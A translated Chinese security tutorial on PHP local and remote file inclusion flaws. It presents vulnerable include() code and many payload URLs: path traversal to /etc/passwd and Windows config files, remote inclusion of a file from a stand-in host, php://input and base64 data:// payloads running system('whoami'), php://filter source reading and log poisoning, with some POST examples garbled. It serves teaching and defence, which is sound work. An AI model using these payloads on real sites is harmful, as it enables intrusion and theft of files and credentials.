# 技术分享：常见文件包含漏洞的发生场景与防御

## 译文声明
本文为翻译文章，原文来源：神月资讯
原文地址：[请提供具体链接]
译文仅供参考，具体内容表达及含义以原文为准。

## 前言
PHP 是一种非常流行的 Web 开发语言，许多互联网上的 Web 应用都是使用 PHP 开发的。在这些应用中，PHP 文件包含漏洞是一种常见的安全问题。攻击者常常利用这种漏洞入侵网站。本文将对 PHP 文件包含漏洞的形成、利用方法及防范措施进行详细分析，旨在帮助读者更好地理解和防御此类攻击。如有错误或疏漏，请留言指正。

## 一、文件包含概念
### 1. 概念
文件包含（File Inclusion）是代码注入的一种形式，它允许外部数据流（如文件或 POST 数据流）被包含到应用程序中。文件包含漏洞可能出现在 JSP、PHP 和 ASP 等多种编程语言中。本文将以 PHP 为例进行说明。

简单来说，当一个可控变量作为文件名并通过文件包含函数调用时，就可能产生文件包含漏洞。在 PHP 中，文件包含漏洞主要分为两种类型：
- **本地文件包含 (LFI, Local File Inclusion)**
- **远程文件包含 (RFI, Remote File Inclusion)**

是否开启 `allow_url_include` 选项决定了能否包含远程文件。

### 2. 函数
PHP 提供了四个用于包含文件的函数：
- **`include()`**：当执行到 `include()` 函数时才包含文件，发生错误时只给出警告并继续执行。
- **`include_once()`**：功能与 `include()` 相同，但重复调用同一文件时只会调用一次。
- **`require()`**：如果发生错误，会输出错误信息并终止脚本运行。程序一开始就调用文件，而不是等到执行到该函数时。
- **`require_once()`**：功能与 `require()` 相同，但重复调用同一文件时只会调用一次。

区别：
- `include()` 和 `include_once()` 在包含文件时即使遇到错误也只会生成警告（E_WARNING），并且继续执行后续代码。
- `require()` 和 `require_once()` 则会在发生错误时生成致命错误（E_COMPILE_ERROR）并停止脚本执行。

因此，如果您希望即使包含文件丢失也能继续执行并向用户输出结果，请使用 `include()`。否则，在框架、CMS 或复杂的 PHP 应用程序中，请始终使用 `require` 来引用关键文件，以提高应用程序的安全性和完整性。

## 二、主要包含形式
### 1. 包含本地文件
示例代码（`main.php`）：
```php
<?php
$page = $_GET['page'];
include($page);
?>
```

Payload 示例：
- 绝对路径：
  - `http://www.aaa.com/include/main.php?page=C:\oneword`
  - `http://www.aaa.com/file.php?file=C:\boot.ini`（Windows 查看系统版本）
  - `http://www.aaa.com/file.php?file=C:\Windows\System32\inetsrv\MetaBase.xml`（Windows 查看 IIS 配置文件）

- 相对路径：
  - `http://www.aaa.com/include/main.php?page=../../oneword`
  - `http://www.aaa.com/main.php?page=../../../../../etc/passwd`
  - `http://www.aaa.com/main.php?page=../../../../../proc/self/environ`

### 2. 包含远程文件
示例代码（`url.php`）：
```php
<?php
$url = $_GET['url'];
include($url);
?>
```

Payload 示例：
- `http://www.aaa.com/include/url.php?url=http://www.bbb.com/2.txt`
- `http://www.aaa.com/include/url.php?url=[http|https|ftp]://www.bbb.com/2.txt`（支持 HTTP、HTTPS 和 FTP 协议）

## 三、文件包含技巧
### 1. 包含上传文件
如果用户上传的文件内容中包含 PHP 代码，并且通过文件包含函数加载，那么这些代码将会被执行。攻击成功与否取决于上传功能的设计，例如上传文件的物理路径和执行权限。

**防御措施：**
- 限制上传文件的类型和大小。
- 隐藏文件路径。
- 设置严格的文件访问和执行权限。

### 2. 伪协议
#### 1. `php://input`
- **说明**：接收 POST 数据。可以通过 `php://input` 将语句输入并执行。
- **条件**：PHP 版本 >= 5.0，且 `allow_url_fopen` 选项开启。

**示例：**
- **增加一句话**：
  - URL: `http://localhost/include/file.php?file=php://input`
  - POST: `") ?>`

- **增加文件**：
  - URL: `http://localhost/include/file.php?file=php://input`
  - POST: `") ?>`

- **执行系统命令**：
  - URL: `http://localhost/include/file.php?file=php://input`
  - POST: `system('whoami');`

#### 2. `data://`
- **说明**：这是一种数据流封装器，类似于 `data:URI schema`。利用 `data://` 伪协议可以实现类似 `php://input` 的代码执行。
- **条件**：`allow_url_include` 选项开启，PHP 版本 >= 5.2。

**示例：**
- **文字命令**：
  - 后台 PHP 代码：
    ```php
    <?php
    $file = $_GET['file'];
    include($file);
    ?>
    ```
  - Payload:
    - `http://localhost/file.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKHdob2FtaSk/Pg==`（使用 Base64 加密的内容）

- **图片命令**：
  - 后台 PHP 代码：
    ```php
    <?php
    $imagedata = $_GET['imagedata'];
    include($imagedata);
    ?>
    ```
  - Payload:
    - `http://localhost/image.php?imagedata=data:image/jpeg;base64,....`（后面加上图片木马）

#### 3. `php://filter`
- **说明**：用于查看源码。直接包含 PHP 文件时会被解析，无法看到源码，因此可以使用 `filter` 来读取。
- **条件**：无特殊要求。

**示例：**
- **绝对路径**：
  - `http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=C:\oneword`

- **相对路径**：
  - `http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=../../oneword`

- **远程文件**：
  - `http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=[http|https|ftp]://www.bbb.com/2.txt`

### 3. 包含日志文件
- **说明**：攻击者可以向 Web 日志中插入 PHP 代码，通过文件包含漏洞来执行这些代码。需要注意的是，如果网站访问量大，日志文件可能会非常大，导致 PHP 进程卡死。通常在凌晨时进行攻击更容易成功。

**日志默认路径：**
- **Apache + Linux**：
  - `/etc/httpd/logs/access_log`
  - `/var/log/httpd/access_log`

- **Apache + Windows 2003**：
  - `D:\xampp\apache\logs\access.log`
  - `D:\xampp\apache\logs\error.log`

- **IIS 6.0 + Windows 2003**：
  - 默认日志文件路径请参考相关文档。

通过以上分析，希望能帮助大家更好地理解和防御 PHP 文件包含漏洞。